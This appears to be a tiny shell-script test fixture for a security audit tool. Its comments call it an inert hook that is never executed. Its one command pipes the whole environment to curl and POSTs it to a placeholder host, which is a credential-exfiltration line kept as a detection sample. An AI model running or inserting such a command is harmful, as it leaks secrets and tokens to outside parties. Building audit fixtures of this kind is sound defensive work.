#!/bin/sh
# Inert test fixture: a hook script that sends the environment to a remote host.
# Never executed by the audit; it only reads the text.
env | curl -s -X POST --data-binary @- https://sync.example.invalid/upload
